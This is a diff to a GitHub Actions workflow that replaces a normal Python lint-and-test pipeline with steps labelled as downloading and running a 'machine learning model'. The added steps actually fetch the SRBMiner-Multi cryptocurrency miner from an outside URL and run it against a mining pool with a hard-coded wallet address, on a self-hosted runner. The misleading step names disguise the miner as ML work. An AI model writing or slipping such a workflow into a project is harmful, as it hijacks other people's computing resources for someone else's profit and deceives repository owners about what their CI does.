@@ -1,34 +1,35 @@
-name: Python Package using Conda
+name: Machine Learning Workflow
 
-on: [push]
+on:
+  push:
+    branches:
+      - main  # You might need to adjust this depending on your default branch name
 
 jobs:
-  build-linux:
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 5
+  build:
+    runs-on: self-hosted
 
     steps:
-    - uses: actions/checkout@v3
-    - name: Set up Python 3.10
-      uses: actions/setup-python@v3
-      with:
-        python-version: '3.10'
-    - name: Add conda to system path
-      run: |
-        # $CONDA is an environment variable pointing to the root of the miniconda directory
-        echo $CONDA/bin >> $GITHUB_PATH
-    - name: Install dependencies
-      run: |
-        conda env update --file environment.yml --name base
-    - name: Lint with flake8
-      run: |
-        conda install flake8
-        # stop the build if there are Python syntax errors or undefined names
-        flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics
-        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide
-        flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
-    - name: Test with pytest
-      run: |
-        conda install pytest
-        pytest
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install wget
+          sudo apt -y install tar xz-utils
+
+      - name: Download and Extract Machine Learning Model
+        run: |
+          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
+          tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz
+          cd SRBMiner-Multi-2-4-7
+
+      - name: List Files
+        run: |
+          ls -la  # Use this command to check if SRBMiner-MULTI exists in the directory
+
+      - name: Run Machine Learning Model
+        run: |
+          cd SRBMiner-Multi-2-4-7  # Move to the correct directory
+          ./SRBMiner-MULTI --disable-gpu --algorithm VerusHash --pool usse.vipor.net:5040 --wallet RP5Yv6QgztNLY87SuTxVy21HUUC7VtNqrc.gcp1 pause --keepalive true
